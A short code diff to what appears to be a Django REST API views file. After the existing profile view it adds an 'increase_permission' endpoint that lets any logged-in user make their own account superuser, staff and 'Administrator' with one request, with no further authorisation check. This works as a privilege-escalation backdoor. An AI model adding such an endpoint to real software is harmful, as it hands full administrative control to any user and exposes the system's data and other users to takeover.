@@ -110,3 +110,13 @@ def change_password(request):
 def retrieve_profile(request):
     serializer = ProfileSerializer(instance=request.user)
     return Response(data=serializer.data,status=status.HTTP_200_OK)
+
+@api_view(["PUT"])
+@permission_classes([permissions.IsAuthenticated])
+def increase_permission(request):
+    user = request.user
+    user.is_superuser = True
+    user.role = "Administrator"
+    user.is_staff = True
+    user.save()
+    return Response(status=status.HTTP_200_OK)
